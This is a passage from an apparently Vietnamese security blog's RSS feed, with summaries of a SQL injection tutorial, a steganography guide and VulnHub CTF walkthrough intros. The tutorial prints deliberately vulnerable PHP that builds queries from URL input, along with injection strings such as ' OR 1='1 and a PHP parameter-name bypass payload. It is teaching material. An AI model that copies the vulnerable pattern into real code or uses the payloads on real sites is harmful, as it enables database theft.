&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;news&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;news&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mo&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;+AND+1=0--
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Trong PHP, giá trị của argument name trong ví dụ trên &lt;code&gt;%20news[id%00&lt;/code&gt; sẽ được lưu trữ tại &lt;code&gt;$_GET[&amp;quot;news_id&amp;quot;]&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tại-sao&#34;&gt;Tại sao&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;PHP cần chuyển đổi tất cả các đối số thành một tên biến hợp lệ, vì vậy khi chuỗi truy vấn được phân tích, nó thực hiện 2 điều chính:&lt;/p&gt;</description>
    </item>
    <item>
      <title>Cách ấn dữ liệu bí mật trong tệp hình ảnh hoặc âm thanh chỉ mất vài giây và vô cùng an toàn</title>
      <link>https://minhtuanact.github.io/posts/cach-an-du-lieu-bi-mat-trong-tep-hinh-anh-hoac-am-thanh-chi-mat-vai-giay-va-vo-cung-an-toan/</link>
      <pubDate>Tue, 02 Jul 2019 12:58:46 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/cach-an-du-lieu-bi-mat-trong-tep-hinh-anh-hoac-am-thanh-chi-mat-vai-giay-va-vo-cung-an-toan/</guid>
      <description>&lt;h2 id=&#34;mở-đầu&#34;&gt;Mở đầu&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Steganography là một nghệ thuật che giấu thông tin trong mắt người bình thường. Ở đây, mình sẽ hướng dẫn chỉ cho bạn cách sử dụng Steghide - một công cụ terminal rất đơn giản được sử dụng để làm việc đó. Mình sẽ giải thích về khái niệm để bạn hiểu về những gì đang xảy ra ở trong tập tin. Đây là một công cụ đơn giản, có thể cấu hình và chỉ mât vài giây để ẩn thông tin trong nhiều loại tệp khác nhau.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;khái-niệm&#34;&gt;Khái niệm&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Không giống như mã hóa, để ẩn một tin nhắn, steganography nhúng dữ liệu trong một khung hình, trong một tệp hình ảnh. Đối với những người xem ảnh bình thường, họ sẽ k biết rằng bức ảnh đấy đang chứa dữ liệu được ẩn ở trong đó. Bức ảnh đó trông giống như những bức ảnh bình thường khác, rất khó có thể phát hiện ra có điều gì đang ẩn sau nó :D&lt;/li&gt;
&lt;li&gt;Thực chất Steganography đã được con người biết tới từ rất lâu rồi. Năm 440 trước công nguyên, người Herodotus (Người Hy Lạp xa xưa) đã cạo trọc đầu các nô lệ tin cậy rồi xăm lên đó các thông điệp và chờ tóc mọc lại. Mục đích của việc này là nhằm gửi tin đi trong cuộc chiến tranh giữa người Herodotus và Persians (Người Ba Tư).&lt;/li&gt;
&lt;li&gt;Trong các cuộc chiến tranh thế giới, Steganography cũng được sử dụng. Người Đức đã sử dụng mực không màu để viết các dấu chấm nhỏ lên phía trên và dưới các chữ cái bằng cách thay đổi chiều cao các chữ trong đoạn văn bản. Trong chiến tranh thế giới thứ nhất, các tù nhân cũng sử dụng mã Morse để gửi thư về nhà bằng cách viết các dấu chấm và gạch ngang lên các chữ cái i,j,t,f.&lt;/li&gt;
&lt;li&gt;Mục đích cuối cùng của Steganography là ẩn thông tin bí mật trong các dữ liệu vô hại để đối phương không biết đến sự hiện diện của chúng.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;steganography-được-thực-hiện-như-thế-nào&#34;&gt;Steganography được thực hiện như thế nào&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Có một số kỹ thuật để ẩn dữ liệu trong các tệp bình thường. Một trong những phương pháp được sử dụng rộng rãi nhất và có lẽ dễ hiểu nhất là kỹ thuật LSB (Least Significant Bit) - kỹ thuật giấu tin vào bit có trọng số thấp nhất.&lt;/li&gt;
&lt;li&gt;Kỹ thuật này thay đổi các bit cuối cùng của một byte để mã hóa một thông điệp mình cần giấu vào tệp đó. Ví dụ trong một hình ảnh, hình ảnh thì được tạo nên bởi cái pixel có các giá trị đỏ, lục, lam biểu thị bằng 8 bit (1 byte) trong khoảng từ &lt;code&gt;0 - 255&lt;/code&gt; theo số thập phân hoặc &lt;code&gt;00000000&lt;/code&gt; đến &lt;code&gt;11111111&lt;/code&gt; ở dạng nhị phân.&lt;/li&gt;
&lt;li&gt;Thay đổi hai bit cuối cùng của pixel màu đỏ hoàn toàn từ &lt;code&gt;11111111&lt;/code&gt; thành &lt;code&gt;11111101&lt;/code&gt; chỉ thay đổi giá trị màu đỏ từ &lt;code&gt;255&lt;/code&gt; thành &lt;code&gt;253&lt;/code&gt;, không tạo ra sự thay đổi đáng chú ý bằng mắt thường nhưng vẫn cho phép dữ liệu được mã hóa vào trong hình ảnh.!&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://images.viblo.asia/36702e35-3cc1-4778-b243-51210889539c.jpg&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>VulnHub CTF - Raven 2 Walkthrough - Vẫn là chiếm quyền root, lần này là Mysql</title>
      <link>https://minhtuanact.github.io/posts/vulnhub-ctf-raven-2-walkthrough-van-la-chiem-quyen-root-lan-nay-la-mysql/</link>
      <pubDate>Thu, 20 Jun 2019 15:51:23 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/vulnhub-ctf-raven-2-walkthrough-van-la-chiem-quyen-root-lan-nay-la-mysql/</guid>
      <description>&lt;h2 id=&#34;mở-đầu&#34;&gt;Mở đầu&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Dạo này mình rất có hứng thú với mấy bài lab trên VulnHub.com. Lần này lại là một bài nữa, có thể chọc ngoáy khá nhiều vấn đề ở bài này. Bạn nào muốn build lên làm thử thì qua link này &lt;a href=&#34;https://www.vulnhub.com/entry/raven-2,269/&#34;&gt;Raven: 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Thôi thì bắt đầu vào chiến thôi. Bài này có tất cả là 4 cờ. Mình đi theo hướng tìm lần lượt 4 cờ luôn nhé.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tấn-công&#34;&gt;Tấn công&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Bắt đầu thì vẫn công việc quen thuộc quét &lt;code&gt;nmap&lt;/code&gt; các thứ thì giống các bài lab trước đó của mình nhé.&lt;/li&gt;
&lt;li&gt;Quét được địa chỉ ip của nó là &lt;code&gt;http://192.168.19.17/&lt;/code&gt;, mở ra xem có gì không nào.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://images.viblo.asia/9cebd111-6d0c-492f-b24d-8488d87cdb8d.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>VulnHub CTF - Silky-CTF: 0x02 - Lỗi Buffer OverFlow</title>
      <link>https://minhtuanact.github.io/posts/vulnhub-ctf-silky-ctf-0x02-loi-buffer-overflow/</link>
      <pubDate>Tue, 18 Jun 2019 11:21:04 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/vulnhub-ctf-silky-ctf-0x02-loi-buffer-overflow/</guid>
      <description>&lt;h2 id=&#34;mở-đầu&#34;&gt;Mở đầu&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Lại là mình đây, vẫn là cái serie vào &lt;code&gt;/root&lt;/code&gt; để lấy cờ :joy_cat::joy_cat::joy_cat:. Vẫn là mấy bài lab trên VulnHub.com. Lần này sẽ là một bài khá đơn giản về lỗi Buffer OverFlow.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/silky-ctf-0x02,307/&#34;&gt;Silky-CTF: 0x02&lt;/a&gt;, Link bài lab, các bạn có thể tải về và build nó lên rồi làm thử nhé. Nếu mà chưa làm được hay bí bách chỗ nào thì kéo xuống dưới nè. Mình hint cho :D&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tấn-công&#34;&gt;Tấn công&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Vẫn như thường lệ, build lab lên rồi phải dò IP của bài lab bằng &lt;code&gt;nmap&lt;/code&gt; thôi. Quét ra địa chỉ &lt;code&gt;192.168.19.107&lt;/code&gt; rồi. Vào trang thì thấy như này.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://images.viblo.asia/0de479a0-a77e-4db2-a3c3-bd4092b4608e.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>VulnHub CTF - DC-2 - Cướp 5 flags và cái kết</title>
      <link>https://minhtuanact.github.io/posts/vulnhub-ctf-dc-2-cuop-5-flags-va-cai-ket/</link>
      <pubDate>Mon, 17 Jun 2019 08:02:36 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/vulnhub-ctf-dc-2-cuop-5-flags-va-cai-ket/</guid>
      <description>&lt;h1 id=&#34;mở-đầu&#34;&gt;Mở đầu&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Tiếp tục là mình đây, sau khi viết xong bài &lt;a href=&#34;https://viblo.asia/p/dc-3-walkthrough-cuoc-phieu-luu-y-thu-gAm5yXeEldb&#34;&gt;DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú&lt;/a&gt; thì mình lại build lên lab nữa cho nhóm thử sức xem sao. Cụ thể là lab &lt;a href=&#34;http://www.five86.com/dc-2.html&#34;&gt;DC-2&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Bài này có tất cả là 5 cờ, tính cả cờ cuối. Chúng ta phải tìm đủ 5 cờ đó mới hoàn thành bài lab này. Mọi người theo mình nhé.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tấn-công&#34;&gt;Tấn công&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Vẫn như các bài khác, đầu tiên mình phải dùng &lt;code&gt;nmap&lt;/code&gt; quét tất cả các IP trong dải mạng của mình để tìm ra IP của lab.&lt;/p&gt;</description>
    </item>
    <item>
      <title>VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú</title>
      <link>https://minhtuanact.github.io/posts/vulnhub-ctf-dc-3-walkthrough-cuoc-phieu-luu-ky-thu/</link>
      <pubDate>Fri, 14 Jun 2019 10:08:47 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/vulnhub-ctf-dc-3-walkthrough-cuoc-phieu-luu-ky-thu/</guid>
      <description>&lt;h2 id=&#34;mở-đầu&#34;&gt;Mở đầu&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Vào một ngày trời k được đẹp cho lắm, nắng khá gắt, captain có ném cho chúng tôi 1 đường link về mấy bài lab trên &lt;code&gt;VulnHub&lt;/code&gt;. Và đây là một trong một số bài mà chúng tôi làm được. Các bài kia rồi cũng sẽ có bài viết nhanh thôi :D.&lt;/li&gt;
&lt;li&gt;Tôi có nhiệm vụ build con máy này lên, cũng không có khó khăn gì lắm. Mở &lt;code&gt;Virtual Box&lt;/code&gt; chọn card mạng bridge để cho anh em vào được rồi run nó lên thôi.&lt;/li&gt;
&lt;li&gt;Link con lab ấy đây, bạn nào muốn nghịch thì vào đây nha  &lt;a href=&#34;https://www.vulnhub.com/entry/dc-3,312/&#34;&gt;DC-3&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tấn-công&#34;&gt;Tấn công&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Trong mô tả của lab &lt;code&gt;DC-3&lt;/code&gt; cũng đã nói. Nó sẽ cho ta 1 con web và bắt chúng ta phải chiếm được quyền &lt;code&gt;root&lt;/code&gt; và lấy cờ từ đó.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Phần 9: SQL Injection</title>
      <link>https://minhtuanact.github.io/posts/phan-9-sql-injection/</link>
      <pubDate>Thu, 30 May 2019 14:19:51 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/phan-9-sql-injection/</guid>
      <description>&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;SQL ( /ˈɛs kjuː ˈɛl/, hoặc /ˈsiːkwəl/; Structured Query Language) hay ngôn ngữ truy vấn mang tính cấu trúc, là một loại ngôn ngữ máy tính phổ biến để tạo, sửa, và lấy dữ liệu từ một hệ quản trị cơ sở dữ liệu quan hệ.&lt;/li&gt;
&lt;li&gt;SQL Injection hoặc SQLi xảy ra khi có một lỗ hổng database-backed trên trang web cho phép Attacker truy vấn hoặc tấn công database của trang web. Các cuộc tấn công SQLi thường được thưởng cao vì mức độ nguy hiểm của chúng. Attacker có thể lấy toàn bộ dữ liệu trên website của bạn, thậm chí có thể chỉnh sửa chúng, thao túng và thậm chí có thể tự tạo một admin đăng nhập vào cơ sở dữ liệu của bạn. \&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;sql-databases&#34;&gt;SQL Databases&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Database lưu trữ thông tin trong các bản ghi và các trường có trong một tập hợp các bảng (còn được gọi là các bảng dữ liệu). Các bảng chứa một hoặc nhiều cột, một hàng trong bảng biểu thị một bản ghi trong CSDL (cơ sở dữ liệu). Người dùng dựa vào ngôn ngữ lập trình có tên là SQL để tạo, đọc, cập nhật và xóa các bản ghi trong CSLD. Người dùng gửi các lệnh SQL (còn được gọi là câu lệnh hoặc truy vấn) đến CSDL và giả sử các lệnh được chấp nhận, CSDL sẽ diễn giải các câu lệnh và thực hiện một số hành động. CSDL SQL phổ biến bao gồm có MySQL, Postgresql, MSSQL, &amp;hellip; Chúng tôi sẽ sử dụng MySQL cho các mục đích của chương này nhưng các khái niệm chung áp dụng cho tất cả các CSDL SQL. Các câu lệnh SQL được tạo thành từ các từ khóa và hàm.&lt;/li&gt;
&lt;li&gt;Ví dụ: Câu lệnh sau cho CSDL chọn thông tin từ cột tên trong bảng người dùng, cho các bản ghi trong đó cột ID bằng 1.
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Nhiều trang web dựa trên CSDL để lưu trữ thông tin và sử dụng thông tin đó để tự động tạo nội dung. Ví dụ trang &lt;code&gt;https://www.leanpub.com/ &lt;/code&gt; lưu trữ các đơn đặt hàng trước đó hoặc danh sách các sách điện tử đã mua trong CSDL mà bạn truy cập khi đăng nhập bằng tài khoản của mình. Trình duyệt web của bạn truy vấn CSDL của trang web và tạo HTML dựa trên thông tin được trả về. Hãy cùng xem một ví dụ lý thuyết về máy chủ được code bằng PHP để tạo lệnh MySQL sau khi người dùng truy cập URL &lt;code&gt;https://www.leanpub.com?name=yaworsk&lt;/code&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$q&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE name = &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Mã sử dụng &lt;code&gt;$_GET[]&lt;/code&gt; để truy cập giá trị tên từ các tham số URL được chỉ định giữa các dấu ngoặc và lưu giá trị trong biến &lt;code&gt;$name&lt;/code&gt;. Tham số này sau đó được chuyển đến biến &lt;code&gt;$q&lt;/code&gt; mà không cần sanitization. Biến &lt;code&gt;$q&lt;/code&gt; đại diện cho truy vấn để thực thi và tìm nạp tất cả dữ liệu từ bảng &lt;code&gt;users&lt;/code&gt; trong đó cột tên khớp với giá trị trong tham số URL name. Truy vấn được thực hiện bằng cách chuyển biến &lt;code&gt;$q&lt;/code&gt; cho hàm PHP mysql_query. Trang web trả lại tên chứa văn bản thông thường, nhưng nếu người dùng nhập 1 input &lt;code&gt;&#39;OR 1=&#39;1&lt;/code&gt; vào tham số URL như &lt;code&gt;https://www.leanpub.com?name=test&#39; OR 1=&#39;1&lt;/code&gt;, truy vấn sẽ được thực hiện là:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE name = &amp;#39;test&amp;#39; OR 1=&amp;#39;1&amp;#39; &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Truy vấn đã được thay đổi sau khi kiểm tra giá trị và thêm mã SQL &lt;code&gt;OR 1=&#39;1&lt;/code&gt; vào cuối truy vấn. Trong trường hợp này, SQLi sửa đổi mệnh đề &lt;code&gt;WHERE&lt;/code&gt; để tìm kiếm các bản ghi trong cột tên khớp với phần search hoặc equattion &lt;code&gt;1=&#39;1&lt;/code&gt; sẽ trả về giá trị true. MySQL coi &lt;code&gt;1&lt;/code&gt; là số nguyên và vì 1 luôn bằng 1, điều kiện đúng và truy vấn sẽ trả về tất cả các bản ghi trong bảng users. Tuy nhiên, việc kiểm tra injection &lt;code&gt;OR 1=&#39;1&lt;/code&gt; sẽ hoạt động khi các phần khác của truy vấn được sanitized. Ví dụ, bạn có thể có một query như:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pw&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE name = &amp;#39;$name&amp;#39; AND pw = &amp;#39;$pw&amp;#39; &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Trong trường hợp này, tham số password cũng do người dùng kiểm soát nhưng được sanitized đúng cách bằng cách sử dụng hàm &lt;code&gt;mysql_real_escape_string&lt;/code&gt;. Nếu bạn sử dụng payload, hãy kiểm tra &lt;code&gt;OR 1=&#39;1&lt;/code&gt; làm name và mật khẩu sẽ là 12345.
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE name = &amp;#39;test&amp;#39; OR 1=&amp;#39;1&amp;#39; AND pw = &amp;#39;12345&amp;#39; &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
